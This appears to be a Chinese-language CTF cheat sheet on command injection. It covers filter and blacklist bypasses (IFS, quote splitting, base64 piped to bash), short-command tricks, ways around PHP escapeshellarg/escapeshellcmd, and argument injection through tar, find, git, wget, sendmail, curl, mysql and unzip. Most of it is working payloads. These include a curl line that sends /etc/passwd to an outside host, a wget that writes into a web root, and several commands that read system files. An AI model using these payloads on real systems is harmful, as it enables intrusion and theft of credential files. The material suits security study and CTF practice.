# 命令执行

## 推荐网站

https://chybeta.github.io/2017/08/15/命令执行的一些绕过技巧/

https://www.anquanke.com/post/id/107336

## tricks

### 绕过空格限制

#### `<` 符号:cat<flag

#### `$IFS$9` 符号 `${IFS}` 符号

#### \t和\r和\n代替空格

### 绕过黑名单:

#### ""和''还有\`\`:

`l''s`,`l""s`

#### base64编码

\`echo "base64编码"|base64 -d\`和`echo "base64编码"|base64 -d|bash`

#### 变量名拼接:

`a=ec;b=ho;$a$b hello`

## 短命令执行

https://err0rzz.github.io/2017/11/13/ctf命令执行与绕过/

关键命令:

- ls 

-t :按照最后修改时间排序

- sh

#### 实例

```shell
>lo\\
>\ hel\\
>echo\\
ls -t>_
sh _
```



## escapeshellarg和escapeshellcmd

https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html

escapeshellcmd,或者escapeshellarg放在参数选项中可结合参数来利用(某些参数能执行命令).结合参数注入利用

### escapeshellarg和escapeshellcmd联合使用,可以传递多个参数

列出/tmp的文件并忽略sth

```php
$arg = "sth";
system(escapeshellcmd("ls --ignore=".escapeshellarg($arg).' /tmp'));
```

列出/tmp的文件并忽略sth并使用长列表格式

```php
$arg = "sth' -l ";
// ls --ignore='exploit'\\'' -l \' /tmp
system(escapeshellcmd("ls --ignore=".escapeshellarg($arg).' /tmp'));
```

### 利用.bat的命令执行

Print list of files inside `somedir`.

```php
$dir = "somedir";
file_put_contents('out.bat', escapeshellcmd('dir '.$dir));
system('out.bat');
```

Also execute `whoami` command.

```php
$dir = "somedir \x1a whoami";
file_put_contents('out.bat', escapeshellcmd('dir '.$dir));
system('out.bat');
```



## 参数注入

https://www.anquanke.com/post/id/107336#h2-0

https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html#escapeshellcmd-with-escapeshellarg

### tar

关键参数:--use-compress-program=

可以造成命令执行

例子:

```shell
tar --use-compress-program='cat /etc/passwd' -cf 2.tar *
cat 2.tar
```



### find

关键参数: -exec 

例子:` find . -type f -exec 命令 \; -quit`

` find . -type f -exec cat /etc/passwd \; -quit`

` find . -type f -exec echo hello \; -quit`

若与escapeshellcmd和escapeshellarg一起使用

不需要加\,因为这两个函数会自动帮我们转义

### git

关键参数:--open-files-in-pager=

例子:`git grep -i --line-number -e '--open-files-in-pager=命令;' master`

### wget

关键参数:--directory-prefix

下载example.php

```php
$url = 'http://example.com/example.php';
system(escapeshellcmd('wget '.$url));
```

下载并将其保存在特殊位置

```php
$url = '--directory-prefix=/var/www/html http://example.com/example.php';
system(escapeshellcmd('wget '.$url));
```

### sendmail

发送mail.txt。设置来信人为:from@sth.com

`sendmail -t -i -f from@sth.com < mail.txt`

打印/etc/passwd的内容

`sendmail -t -i -f from@sth.com -C/etc/passwd -X/tmp/output.txt < mail.txt`

### curl

关键参数:-F

下载网页内容:

`curl http://example.com`

将/etc/passwd 发送到http://example.com:xxxx配合监听获取文件内容

`curl -F password=@/etc/passwd http://example.com`

![](http://ww1.sinaimg.cn/large/006pWR9agy1g68qtlpvsqj30nj0iiq4n.jpg)

### mysql

执行sql语句

`mysql -uuser -ppassword -e  SELECT sth FROM table`

执行命令

`mysql -uuser -ppassword -e  \! 命令`

### untar

Unpack all `*.tmp` files from `archive.zip` into `/tmp` directory.

```
$zip_name = 'archive.zip';
system(escapeshellcmd('unzip -j '.$zip_name.' *.txt -d /aa/1'));
```

Unpack all `*.tmp` files from `archive.zip` into `/var/www/html` directory.

```
$zip_name = '-d /var/www/html archive.zip';
system('unzip -j '.escapeshellarg($zip_name).' *.tmp -d /tmp');
```

